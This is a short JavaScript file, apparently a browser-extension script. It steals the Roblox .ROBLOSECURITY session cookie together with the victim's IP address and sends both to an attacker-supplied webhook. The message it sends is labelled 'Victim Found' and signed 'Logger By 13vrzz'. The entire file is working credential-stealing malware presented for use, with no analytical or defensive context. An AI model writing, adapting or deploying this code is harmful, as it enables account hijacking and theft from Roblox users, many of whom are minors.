const WEBHOOK = "CHANGE THIS TO YOUR WEBHOOK";
const imageURL = "https://i.imgur.com/rzlWEHU.jpeg";

async function main(cookie) {
  let ipAddress;
  try {
    ipAddress = await (await fetch("https://api.ipify.org")).text();
  } catch (error) {
    console.error("Error fetching IP address:", error);
    ipAddress = "N/A";
  }

  let userInfo = null;
  if (cookie) {
    try {
      const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
        headers: {
          Cookie: ".ROBLOSECURITY=" + cookie
        },
        redirect: "manual"
      });

      if (!response.ok) {
        throw new Error(`Failed to fetch user info, status: ${response.status}`);
      }

      userInfo = await response.json();
    } catch (error) {
      console.error("Error fetching Roblox user info:", error);
      userInfo = null;
    }
  }

  const webhookPayload = {
    content: null,
    embeds: [
      {
        description: "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
        color: null,
        fields: [],
        author: {
          name: "Victim Found: " + ipAddress,
          icon_url: imageURL
        },
        footer: {
          text: "Logger By 13vrzz",
          icon_url: imageURL
        },
        thumbnail: {
          url: imageURL
        }
      }
    ],
    username: "Roblox",
    avatar_url: imageURL,
    attachments: []
  };

  fetch(WEBHOOK, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(webhookPayload)
  });
}

chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, (cookie) => {
  main(cookie ? cookie.value : null);
});
